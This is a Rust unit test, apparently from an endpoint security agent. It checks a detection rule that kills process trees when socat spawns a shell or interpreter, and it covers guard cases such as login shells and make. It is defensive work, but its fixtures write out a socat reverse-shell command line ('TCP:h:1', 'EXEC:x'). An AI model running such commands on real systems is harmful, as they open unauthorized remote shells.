        let t = AuthSessionTracker::<H>::new(dir.path());
        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
            .with_lineage(Some(t.clone()));
        let socat = child(
            5490,
            1,
            "/usr/bin/socat1",
            &["socat", "TCP:h:1", "EXEC:x"],
            100,
        );
        t.ingest_spawn_event(&socat);
        let kill = |e: &Event| {
            t.ingest_spawn_event(e);
            r.evaluate(e).map(|v| (v.action, v.severity, v.reasoning))
        };
        let sh = child(5491, 5490, "/usr/bin/dash", &["/bin/s\\h"], 200);
        let (action, severity, why) = kill(&sh).expect("the address's shell");
        assert_eq!(
            (action, severity),
            (ResponseAction::KillProcessTree, Severity::Critical)
        );
        assert!(why.contains("started by socat"), "{why}");
        let py = child(
            5492,
            5490,
            "/usr/bin/python3",
            &["python3", "/tmp/x.py"],
            300,
        );
        assert!(kill(&py).is_some(), "an interpreter socat started");
        // through sudo -i: socat → sudo → bash
        let sudo = child(5493, 5490, "/usr/bin/sudo", &["sudo", "-i"], 400);
        t.ingest_spawn_event(&sudo);
        let bash = child(5494, 5493, "/usr/bin/bash", &["-bash"], 500);
        assert!(kill(&bash).is_some(), "the shell sudo started for socat");
        // guards
        let id = child(5495, 5490, "/usr/bin/id", &["id"], 600);
        assert!(kill(&id).is_none(), "no shell");
        let login = child(5496, 1, "/usr/bin/bash", &["-bash"], 700);
        t.ingest_spawn_event(&login);
        let sh2 = child(5497, 5496, "/usr/bin/dash", &["sh"], 800);
        assert!(kill(&sh2).is_none(), "a shell's shell");
        let sudo2 = child(5498, 5496, "/usr/bin/sudo", &["sudo", "-i"], 900);
        t.ingest_spawn_event(&sudo2);
        let bash2 = child(5499, 5498, "/usr/bin/bash", &["-bash"], 1000);
        assert!(kill(&bash2).is_none(), "sudo -i from a login shell");
        // the walk stops at the first hop that is no launcher: a shell a
        // program socat ran starts (make → sh), or one sudo started under it
        let make = child(5500, 5490, "/usr/bin/make", &["make"], 1100);
        t.ingest_spawn_event(&make);
        let sh3 = child(5501, 5500, "/usr/bin/dash", &["sh", "-c", "cc x.c"], 1200);
        assert!(kill(&sh3).is_none(), "make's shell under socat's program");
        let sudo3 = child(5502, 5500, "/usr/bin/sudo", &["sudo", "-i"], 1300);
        t.ingest_spawn_event(&sudo3);
        let bash3 = child(5503, 5502, "/usr/bin/bash", &["-bash"], 1400);
        assert!(
            kill(&bash3).is_none(),
            "sudo's shell under make under socat"
        );
    }
}
